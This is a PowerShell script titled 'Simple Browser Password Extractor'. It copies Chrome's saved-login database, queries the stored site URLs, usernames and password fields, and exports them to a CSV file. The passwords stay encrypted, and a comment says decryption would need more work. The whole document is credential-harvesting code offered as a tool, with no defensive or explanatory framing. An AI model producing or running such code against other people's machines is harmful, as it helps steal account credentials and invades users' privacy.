# Simple Browser Password Extractor
# This uses a direct approach to extract passwords

$results = @()

# Chrome
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chromePath) {
    try {
        Copy-Item $chromePath "$env:TEMP\chrome_passwords.db" -Force
        $data = & "$env:TEMP\sqlite3.exe" "$env:TEMP\chrome_passwords.db" "SELECT origin_url, username_value, password_value FROM logins;"
        
        foreach ($line in $data) {
            $parts = $line -split ","
            if ($parts.Count -ge 3) {
                $results += [PSCustomObject]@{
                    Browser = "Chrome"
                    URL = $parts[0]
                    Username = $parts[1]
                    Password = "ENCRYPTED"  # Would need additional decryption
                }
            }
        }
        Remove-Item "$env:TEMP\chrome_passwords.db" -Force
    } catch {
        Write-Host "Chrome extraction failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Display results
if ($results.Count -gt 0) {
    $results | Format-Table -AutoSize
    $results | Export-Csv "Browser_Passwords.csv" -NoTypeInformation
    Write-Host "Results saved to Browser_Passwords.csv" -ForegroundColor Green
} else {
    Write-Host "No passwords found" -ForegroundColor Yellow
}
